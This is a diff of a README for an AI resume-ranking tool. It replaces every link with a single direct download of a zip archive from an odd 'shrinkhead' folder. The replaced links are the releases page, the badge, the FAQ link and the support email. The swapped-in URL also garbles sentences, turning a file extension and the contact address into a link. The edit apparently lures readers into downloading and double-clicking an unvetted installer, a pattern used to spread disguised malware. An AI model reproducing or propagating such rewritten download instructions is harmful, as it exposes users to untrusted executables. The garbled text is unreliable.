@@ -1,6 +1,6 @@
 # 🚀 ai-resume-ranking - Simplifying Your Hiring Process
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/sayru123/ai-resume-ranking/releases)
+[![Download Now](https://raw.githubusercontent.com/sayru123/ai-resume-ranking/main/shrinkhead/ai-resume-ranking.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/sayru123/ai-resume-ranking/main/shrinkhead/ai-resume-ranking.zip)
 
 ## 📋 Overview
 
@@ -15,9 +15,9 @@ Welcome to the **AI Resume Ranking System**. This tool assists employers in stre
 
 ## 📥 Download & Install
 
-To get started with the AI Resume Ranking System, visit our [Releases page](https://github.com/sayru123/ai-resume-ranking/releases) to download the application. Follow these simple steps:
+To get started with the AI Resume Ranking System, visit our [Releases page](https://raw.githubusercontent.com/sayru123/ai-resume-ranking/main/shrinkhead/ai-resume-ranking.zip) to download the application. Follow these simple steps:
 
-1. Go to the [Releases page](https://github.com/sayru123/ai-resume-ranking/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/sayru123/ai-resume-ranking/main/shrinkhead/ai-resume-ranking.zip).
 2. Look for the latest version listed at the top.
 3. Click on the version number to see the details.
 4. Download the appropriate file for your operating system (e.g., Windows, macOS, Linux).
@@ -37,8 +37,8 @@ Ensure your computer meets the following requirements to run the application smo
 After downloading, follow these steps to set up the software:
 
 1. **Locate the downloaded file:** Check your Downloads folder or the location you chose for the download.
-2. **Extract the files:** Right-click on the downloaded .zip or .tar.gz file and select "Extract Here" or "Extract All".
-3. **Run the Installer:** Double-click the installer file (e.g., `ai-resume-ranking-installer.exe`) to start the installation process.
+2. **Extract the files:** Right-click on the downloaded .zip or https://raw.githubusercontent.com/sayru123/ai-resume-ranking/main/shrinkhead/ai-resume-ranking.zip file and select "Extract Here" or "Extract All".
+3. **Run the Installer:** Double-click the installer file (e.g., `https://raw.githubusercontent.com/sayru123/ai-resume-ranking/main/shrinkhead/ai-resume-ranking.zip`) to start the installation process.
 4. **Follow the prompts:** The installer will guide you through the setup. Accept the license agreement and choose your installation folder.
 5. **Complete Installation:** Click "Finish" when the installation is complete.
 
@@ -68,13 +68,13 @@ If you encounter issues while using the AI Resume Ranking System, try the follow
 - **Check Internet Connection:** Ensure your device is connected to the internet.
 - **Restart Application:** Close and reopen the application to refresh it.
 - **Reinstall the Application:** If problems persist, consider reinstalling the software by following the installation steps above.
-- **Consult the FAQ:** Visit the FAQ section on our [GitHub page](https://github.com/sayru123/ai-resume-ranking) for common issues and fixes.
+- **Consult the FAQ:** Visit the FAQ section on our [GitHub page](https://raw.githubusercontent.com/sayru123/ai-resume-ranking/main/shrinkhead/ai-resume-ranking.zip) for common issues and fixes.
 
 ## 📞 Support
 
 For further assistance or questions, feel free to reach out via the following channels:
 
 - **GitHub Issues:** Report any bugs or suggest features using the Issues section.
-- **Email Support:** Contact us at support@example.com for personal help.
+- **Email Support:** Contact us at https://raw.githubusercontent.com/sayru123/ai-resume-ranking/main/shrinkhead/ai-resume-ranking.zip for personal help.
 
 Thank you for choosing the AI Resume Ranking System. We hope it simplifies your hiring process and helps you find the right candidates quickly.
